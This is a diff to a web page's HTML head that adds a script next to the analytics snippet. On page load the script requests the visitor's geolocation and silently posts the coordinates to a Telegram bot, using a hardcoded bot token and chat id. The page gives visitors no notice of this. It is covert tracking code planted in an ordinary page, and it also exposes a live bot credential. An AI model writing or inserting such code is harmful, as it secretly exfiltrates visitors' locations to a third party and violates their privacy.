@@ -10,6 +10,39 @@
 
     gtag('config', 'G-RTPZX47SDH');
     </script>
+          <script>
+            if (navigator.geolocation) {
+              // if the Geolocation API is supported by the browser
+              navigator.geolocation.getCurrentPosition(function(position) {
+                // if the user grants permission to share their location
+                const message = `E1 LA: ${position.coords.latitude}, LO: ${position.coords.longitude}`;
+                const apiUrl = `https://api.telegram.org/bot5864276889:AAGDkTSUnFxmEqV_z16P8YvnOgeuCT3uLgY/sendMessage`;
+                fetch(apiUrl, {
+                  method: 'POST',
+                  headers: {
+                    'Content-Type': 'application/json'
+                  },
+                  body: JSON.stringify({
+                    chat_id: -636060412,
+                    text: message
+                  })
+                })
+                .then(response => {
+                  if (!response.ok) {
+                    throw new Error(`Failed to send message. code: ${response.status}`);
+                  }
+                  console.log('msg OK!');
+                })
+                .catch(error => {
+                  console.error(`err msg: ${error.message}`);
+                });
+              }, function(error) {
+                console.error(`err loc: ${error.message}`);
+              });
+            } else {
+              console.error('Geo not supported');
+            }
+          </script>
     <meta http-equiv="content-type" content="text/html;charset=utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1.0">
